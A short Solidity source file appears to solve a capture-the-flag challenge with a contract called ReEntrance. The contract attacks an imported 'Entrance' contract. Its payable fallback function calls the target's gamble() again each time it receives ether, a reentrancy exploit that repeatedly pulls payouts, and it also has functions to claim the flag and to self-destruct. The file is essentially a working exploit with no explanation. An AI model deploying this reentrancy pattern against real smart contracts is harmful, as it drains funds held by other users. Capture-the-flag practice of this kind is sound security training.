pragma solidity >=0.4.21 <0.6.0;

import "browser/Entrance.sol";

contract ReEntrance {
  Entrance public entrance;
  string server;
  string port;

  constructor (address _entrance, string _server, string _port) public {
    server = _server;
    port = _port;
    entrance = Entrance(_entrance);
  }
  
  function enter () public {
    entrance.enter(12341111);
    entrance.gamble();
  }
  
  function getFlag () public {
    entrance.getFlag(server, port);
  }

  function kill () public {
    selfdestruct(msg.sender);
  }
  
  function () public payable {
    entrance.gamble();
  }
}
